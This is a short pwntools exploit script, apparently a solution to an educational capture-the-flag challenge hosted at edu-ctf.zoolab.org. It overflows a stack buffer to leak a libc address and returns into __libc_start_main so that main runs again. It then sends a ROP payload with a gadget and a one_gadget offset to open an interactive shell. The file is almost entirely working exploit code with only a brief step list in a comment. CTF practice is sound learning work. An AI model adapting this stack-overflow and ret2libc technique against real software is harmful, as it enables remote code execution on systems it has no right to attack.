#!/usr/bin/env python3

from pwn import *

exe = ELF("chal")
libc = ELF("libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe


'''
1. leak the libc addr
2. jump to __libc_start_main+175 -> it will call main again
3. let libc_addr be libc base address
4. libc base address + 0x000000000008b649 : mov eax, eax ; pop r12 ; ret
5. jump to libc base address + 0xe3afe
'''

#p = process('./chal_patched')
p = remote('edu-ctf.zoolab.org', '10014')

raw_input('>')

guess_address = 0x3f
payload = flat(
  b'A' * 8,
  b'A' * 8,
  b'A' * 8,
  )
payload += b'?' # 0x3f
p.send(payload)
s = (u64(p.recv()[24:24+8]))
print(hex(s))
libc.address = s - 0x2403f
print(hex(libc.address))
# send second time
payload = flat(
  b'A' * 8,
  b'A' * 8,
  b'A' * 8,
  libc.address + 0x000000000008b649, 0x00,
  libc.address + 0xe3afe
)

p.send(payload)

p.interactive()